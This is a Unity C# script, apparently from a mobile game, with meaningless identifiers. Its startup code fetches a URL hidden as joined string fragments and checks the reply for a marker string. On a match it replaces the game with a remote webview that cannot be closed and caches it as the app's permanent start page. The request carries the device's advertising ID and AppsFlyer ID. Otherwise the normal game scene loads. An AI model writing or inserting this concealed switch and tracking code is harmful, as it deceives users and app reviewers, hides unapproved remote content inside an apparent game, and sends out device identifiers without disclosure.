using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class Dsdsfgdas : MonoBehaviour
{
    [SerializeField] private Canvas _canvas;
    [SerializeField] private List<string> _offer;
    private string _iddata = "";
    private string _collector = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("ds4ffsw") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { _iddata = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("dsaload", string.Empty) != string.Empty)
            {
                Loadddlf(PlayerPrefs.GetString("dsaload"));
            }
            else
            {
                foreach (string da in _offer)
                {
                    _collector += da;
                }
                StartCoroutine(InitializeFas());
            }
        }
        else
        {
            Fas3kjfl();
        }
    }

    private void Fas3kjfl()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Main");
    }

    private IEnumerator InitializeFas()
    {
        using (UnityWebRequest asdgdd = UnityWebRequest.Get(_collector))
        {

            yield return asdgdd.SendWebRequest();
            if (asdgdd.isNetworkError)
            {
                Fas3kjfl();
            }
            int time = 7;
            while (PlayerPrefs.GetString("asfgloper", "") == "" && time > 0)
            {
                yield return new WaitForSeconds(1);
                time--;
            }
            try
            {
                if (asdgdd.result == UnityWebRequest.Result.Success)
                {
                    if (asdgdd.downloadHandler.text.Contains("vndifvjerge"))
                    {

                        try
                        {
                            var asd = asdgdd.downloadHandler.text.Split('|');
                            Loadddlf(asd[0] + "?idfa=" + _iddata + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("asfgloper", ""), asd[1], int.Parse(asd[2]));
                        }
                        catch
                        {

                            Loadddlf(asdgdd.downloadHandler.text + "?idfa=" + _iddata + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("asfgloper", ""));
                        }
                    }
                    else
                    {
                        Fas3kjfl();
                    }
                }
                else
                {
                    Fas3kjfl();
                }
            }
            catch
            {
                Fas3kjfl();
            }
        }
    }

    private void Loadddlf(string dasfs, string dasdas = "", int fhbdhdf = 70)
    {
        if (_canvas != null)
        {
            _canvas.gameObject.SetActive(false);
        }
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetAllowAutoPlay(true);

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);

        var dasdascxz = gameObject.AddComponent<UniWebView>();
        dasdascxz.SetAllowFileAccess(true);
        dasdascxz.SetShowToolbar(false);
        dasdascxz.SetSupportMultipleWindows(false, true);
        dasdascxz.SetAllowBackForwardNavigationGestures(true);
        dasdascxz.SetCalloutEnabled(false);
        dasdascxz.SetBackButtonEnabled(true);

        dasdascxz.EmbeddedToolbar.SetBackgroundColor(new Color(0, 0, 0, 0f));
        dasdascxz.SetToolbarDoneButtonText("");
        switch (dasdas)
        {
            case "0":
                dasdascxz.EmbeddedToolbar.Show();
                break;
            default:
                dasdascxz.EmbeddedToolbar.Hide();
                break;
        }
        dasdascxz.Frame = new Rect(0, fhbdhdf, Screen.width, Screen.height - fhbdhdf * 2);
        dasdascxz.OnShouldClose += (view) =>
        {
            return false;
        };
        dasdascxz.SetSupportMultipleWindows(true);
        dasdascxz.SetAllowBackForwardNavigationGestures(true);
        dasdascxz.OnMultipleWindowOpened += (view, windowId) =>
        {
            dasdascxz.EmbeddedToolbar.Show();
        };
        dasdascxz.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (dasdas)
            {
                case "0":
                    dasdascxz.EmbeddedToolbar.Show();
                    break;
                default:
                    dasdascxz.EmbeddedToolbar.Hide();
                    break;
            }
        };
        dasdascxz.OnOrientationChanged += (view, orientation) =>
        {
            dasdascxz.Frame = new Rect(0, fhbdhdf, Screen.width, Screen.height - fhbdhdf);
        };

        dasdascxz.OnLoadingErrorReceived += (view, code, message, payload) =>
        {
            if (payload.Extra != null &&
                payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
            {
                var url = value as string;

                dasdascxz.Load(url);
            }
        };
        dasdascxz.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("dsaload", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("dsaload", url);
            }
        };
        dasdascxz.Load(dasfs);
        dasdascxz.Show();
    }
}
